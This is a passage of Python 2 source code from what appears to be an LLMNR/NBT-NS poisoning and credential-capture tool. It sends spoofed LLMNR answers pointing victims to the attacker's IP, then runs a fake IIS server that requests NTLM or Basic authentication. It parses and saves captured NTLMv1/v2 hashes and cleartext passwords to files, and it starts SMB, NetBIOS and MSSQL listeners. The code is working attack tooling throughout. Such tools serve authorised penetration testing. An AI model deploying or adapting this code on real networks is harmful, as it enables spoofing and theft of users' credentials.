        ("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
        ("IPLen",            "\x00\x04"),
        ("IP",               "\x00\x00\x00\x00"),
    ])

    def calculate(self):
        self.fields["IP"] = inet_aton(OURIP)
        self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))
        self.fields["AnswerNameLen"] = struct.pack(">h",len(self.fields["AnswerName"]))[1]
        self.fields["QuestionNameLen"] = struct.pack(">h",len(self.fields["QuestionName"]))[1]

def Parse_LLMNR_Name(data,addr):
   NameLen = struct.unpack('>B',data[12])[0]
   Name = data[13:13+NameLen]
   print "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(addr[0],Name)
   logging.warning('LLMNR poisoned answer sent to this IP: %s. The requested name was : %s.'%(addr[0],Name))
   return Name

def Parse_IPV6_Addr(data):
    Len = len(data)
    if data[Len-4:Len][1] =="\x1c":
       return False
    else:
       return True

def RunLLMNR():
   ALL = "0.0.0.0"
   MADDR = "224.0.0.252"
   MPORT = 5355
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
   sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
   sock.bind((ALL,MPORT))
   sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
   ## Join IGMP Group.
   Join = sock.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR) + inet_aton(ALL))
   while True:
       try:
          data, addr = sock.recvfrom(1024)
          if data[2:4] == "\x00\x00":
             if Parse_IPV6_Addr(data):
                global Name
                Name = Parse_LLMNR_Name(data,addr)
                buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
                buff.calculate()
                for x in range(1):
                   sock.sendto(str(buff), addr)
       except:
          raise

##################################################################################
#HTTP Stuff
##################################################################################

#HTTP Packet used for further NTLM auth.
class IIS_Auth_401_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: NTLM\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("Len",           "Content-Length: 0\r\n"), 
        ("CRLF",          "\r\n"),                               
    ])

#HTTP NTLM Auth
class NTLM_Challenge(Packet):
    fields = OrderedDict([
        ("Signature",        "NTLMSSP"),
        ("SignatureNull",    "\x00"),
        ("MessageType",      "\x02\x00\x00\x00"),
        ("TargetNameLen",    "\x06\x00"),
        ("TargetNameMaxLen", "\x06\x00"),
        ("TargetNameOffset", "\x38\x00\x00\x00"),
        ("NegoFlags",        "\x05\x02\x89\xa2"),
        ("ServerChallenge",  Challenge),
        ("Reserved",         "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("TargetInfoLen",    "\x7e\x00"),
        ("TargetInfoMaxLen", "\x7e\x00"),
        ("TargetInfoOffset", "\x3e\x00\x00\x00"),
        ("NTLMOsVersion",    "\x05\x02\xce\x0e\x00\x00\x00\x0f"),
        ("TargetNameStr",    "SMB"),
        ("Av1",              "\x02\x00"),#nbt name
        ("Av1Len",           "\x06\x00"),
        ("Av1Str",           "SMB"),
        ("Av2",              "\x01\x00"),#Server name
        ("Av2Len",           "\x14\x00"),
        ("Av2Str",           "SMB-TOOLKIT"),
        ("Av3",              "\x04\x00"),#Full Domain name
        ("Av3Len",           "\x12\x00"),
        ("Av3Str",           "smb.local"),
        ("Av4",              "\x03\x00"),#Full machine domain name
        ("Av4Len",           "\x28\x00"),
        ("Av4Str",           "server2003.smb.local"),
        ("Av5",              "\x05\x00"),#Domain Forest Name
        ("Av5Len",           "\x12\x00"),
        ("Av5Str",           "smb.local"),
        ("Av6",              "\x00\x00"),#AvPairs Terminator
        ("Av6Len",           "\x00\x00"),             
    ])

    def calculate(self):
        ##First convert to uni
        self.fields["TargetNameStr"] = self.fields["TargetNameStr"].encode('utf-16le')
        self.fields["Av1Str"] = self.fields["Av1Str"].encode('utf-16le')
        self.fields["Av2Str"] = self.fields["Av2Str"].encode('utf-16le')
        self.fields["Av3Str"] = self.fields["Av3Str"].encode('utf-16le')
        self.fields["Av4Str"] = self.fields["Av4Str"].encode('utf-16le')
        self.fields["Av5Str"] = self.fields["Av5Str"].encode('utf-16le')
      
        ##Then calculate
        CalculateNameOffset = str(self.fields["Signature"])+str(self.fields["SignatureNull"])+str(self.fields["MessageType"])+str(self.fields["TargetNameLen"])+str(self.fields["TargetNameMaxLen"])+str(self.fields["TargetNameOffset"])+str(self.fields["NegoFlags"])+str(self.fields["ServerChallenge"])+str(self.fields["Reserved"])+str(self.fields["TargetInfoLen"])+str(self.fields["TargetInfoMaxLen"])+str(self.fields["TargetInfoOffset"])+str(self.fields["NTLMOsVersion"])

        CalculateAvPairsOffset = CalculateNameOffset+str(self.fields["TargetNameStr"])

        CalculateAvPairsLen = str(self.fields["Av1"])+str(self.fields["Av1Len"])+str(self.fields["Av1Str"])+str(self.fields["Av2"])+str(self.fields["Av2Len"])+str(self.fields["Av2Str"])+str(self.fields["Av3"])+str(self.fields["Av3Len"])+str(self.fields["Av3Str"])+str(self.fields["Av4"])+str(self.fields["Av4Len"])+str(self.fields["Av4Str"])+str(self.fields["Av5"])+str(self.fields["Av5Len"])+str(self.fields["Av5Str"])+str(self.fields["Av6"])+str(self.fields["Av6Len"])

        # Target Name Offsets
        self.fields["TargetNameOffset"] = struct.pack("<i", len(CalculateNameOffset))
        self.fields["TargetNameLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        self.fields["TargetNameMaxLen"] = struct.pack("<i", len(self.fields["TargetNameStr"]))[:2]
        #AvPairs Offsets
        self.fields["TargetInfoOffset"] = struct.pack("<i", len(CalculateAvPairsOffset))
        self.fields["TargetInfoLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        self.fields["TargetInfoMaxLen"] = struct.pack("<i", len(CalculateAvPairsLen))[:2]
        #AvPairs StrLen
        self.fields["Av1Len"] = struct.pack("<i", len(str(self.fields["Av1Str"])))[:2]
        self.fields["Av2Len"] = struct.pack("<i", len(str(self.fields["Av2Str"])))[:2]
        self.fields["Av3Len"] = struct.pack("<i", len(str(self.fields["Av3Str"])))[:2]
        self.fields["Av4Len"] = struct.pack("<i", len(str(self.fields["Av4Str"])))[:2]
        self.fields["Av5Len"] = struct.pack("<i", len(str(self.fields["Av5Str"])))[:2]

#HTTP NTLM packet.
class IIS_NTLM_Challenge_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWWAuth",       "WWW-Authenticate: NTLM "),
        ("Payload",       ""),
        ("Payload-CRLF",  "\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NC0CD7B7802C76736E9B26FB19BEB2D36290B9FF9A46EDDA5ET\r\n"),
        ("Len",           "Content-Length: 0\r\n"),
        ("CRLF",          "\r\n"),                                            
    ])

    def calculate(self,payload):
        self.fields["Payload"] = b64encode(payload)

#HTTP Basic answer packet.
class IIS_Basic_401_Ans(Packet):
    fields = OrderedDict([
        ("Code",          "HTTP/1.1 401 Unauthorized\r\n"),
        ("ServerType",    "Server: Microsoft-IIS/6.0\r\n"),
        ("Date",          "Date: Wed, 12 Sep 2012 13:06:55 GMT\r\n"),
        ("Type",          "Content-Type: text/html\r\n"),
        ("WWW-Auth",      "WWW-Authenticate: Basic realm=''\r\n"),
        ("PoweredBy",     "X-Powered-By: ASP.NET\r\n"),
        ("Len",           "Content-Length: 0\r\n"), 
        ("CRLF",          "\r\n"),                               
    ])

#Parse NTLMv1/v2 hash.
def ParseHTTPHash(data,client):
    LMhashLen = struct.unpack('<H',data[12:14])[0]
    LMhashOffset = struct.unpack('<H',data[16:18])[0]
    LMHash = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
    NthashLen = struct.unpack('<H',data[20:22])[0]
    NthashOffset = struct.unpack('<H',data[24:26])[0]
    NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
    if NthashLen == 24:
       print "[+]HTTP NTLMv1 hash captured from :",client
       logging.warning('[+]HTTP NTLMv1 hash captured from :%s'%(client))
       NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       HostNameLen = struct.unpack('<H',data[46:48])[0]
       HostNameOffset = struct.unpack('<H',data[48:50])[0]
       Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
       print "Hostname is :", Hostname
       logging.warning('[+]HTTP NTLMv1 Hostname is :%s'%(Hostname))
       UserLen = struct.unpack('<H',data[36:38])[0]
       UserOffset = struct.unpack('<H',data[40:42])[0]
       User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
       logging.warning('[+]HTTP NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
       outfile = "HTTP-NTLMv1-Client-"+client+".txt"
       WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
       WriteData(outfile,WriteHash)
       print "Complete hash is : ", WriteHash
       logging.warning('[+]HTTP NTLMv1 Complete hash is :%s'%(WriteHash))
    if NthashLen > 24:
       print "[+]HTTP NTLMv2 hash captured from :",client
       logging.warning('[+]HTTP NTLMv2 hash captured from :%s'%(client))
       NthashLen = 64
       DomainLen = struct.unpack('<H',data[28:30])[0]
       DomainOffset = struct.unpack('<H',data[32:34])[0]
       Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       print "Domain is : ", Domain
       logging.warning('[+]HTTP NTLMv2 Domain is :%s'%(Domain))
       UserLen = struct.unpack('<H',data[36:38])[0]
       UserOffset = struct.unpack('<H',data[40:42])[0]
       User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", User
       logging.warning('[+]HTTP NTLMv2 User is : %s'%(User))
       HostNameLen = struct.unpack('<H',data[44:46])[0]
       HostNameOffset = struct.unpack('<H',data[48:50])[0]
       HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
       print "Hostname is :", HostName
       logging.warning('[+]HTTP NTLMv2 Hostname is :%s'%(HostName))
       outfile = "HTTP-NTLMv2-Client-"+client+".txt"
       WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
       WriteData(outfile,WriteHash)
       print "Complete hash is : ", WriteHash
       logging.warning('[+]HTTP NTLMv2 Complete hash is :%s'%(WriteHash))

# Function used to check if we answer with a Basic or NTLM auth. 
def Basic_Ntlm(Basic):
    if Basic == "1":
       return IIS_Basic_401_Ans()
    if Basic == "0":
       return IIS_Auth_401_Ans()

#Handle HTTP packet sequence.
def PacketSequence(data,client):
    a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
    b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
    if a:
       packetNtlm = b64decode(''.join(a))[8:9]
       if packetNtlm == "\x01":
          r = NTLM_Challenge()
          r.calculate()
          t = IIS_NTLM_Challenge_Ans()
          t.calculate(str(r))
          buffer1 = str(t)                    
          return buffer1
       if packetNtlm == "\x03":
          NTLM_Auth= b64decode(''.join(a))
          ParseHTTPHash(NTLM_Auth,client)
    if b:
       outfile = "HTTP-Clear-Text-Password-"+client+".txt"
       WriteData(outfile,b64decode(''.join(b)))
       print "[+]HTTP-User & Password:", b64decode(''.join(b))
       logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(b))))

    else:
       return str(Basic_Ntlm(Basic))

#HTTP Server Class
class HTTP(SocketServer.BaseRequestHandler):
    def server_bind(self):
       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
       self.socket.bind(self.server_address)
       self.socket.setblocking(0)
       self.socket.setdefaulttimeout(1)

    def handle(self):
        try:
            for x in range(2):
              data = self.request.recv(8092)
              buffer0 = PacketSequence(data,self.client_address[0])      
              self.request.send(buffer0)
        except Exception:
           pass#No need to be verbose..
           self.request.close()

#Function name self-explanatory
def Is_HTTP_On(on_off):
    if on_off == "ON":
       return thread.start_new(serve_thread_tcp,('', 80,HTTP))
    if on_off == "OFF":
       return False

##################################################################################
#Loading the servers
##################################################################################
SocketServer.UDPServer.allow_reuse_address = 1
SocketServer.TCPServer.allow_reuse_address = 1


def serve_thread_udp(host, port, handler):
	try:
		server = SocketServer.UDPServer((host, port), handler)
		server.serve_forever()
	except:
		print "Error starting UDP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root) and no other servers are running."
 
def serve_thread_tcp(host, port, handler):
	try:
		server = SocketServer.TCPServer((host, port), handler)
		server.serve_forever()
	except:
		print "Error starting TCP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root) and no other servers are running."

def main():
    try:
      Is_HTTP_On(On_Off)
      thread.start_new(serve_thread_tcp, ('', 445,SMB1))
      thread.start_new(serve_thread_tcp,('', 139,SMB1))
      thread.start_new(serve_thread_udp,('', 137,NB))
      thread.start_new(serve_thread_tcp,('', 1433,MSSQL))
      thread.start_new(RunLLMNR())
    except KeyboardInterrupt:
        exit()

if __name__ == '__main__':
    try:
        main()
    except:
        raise
    raw_input()



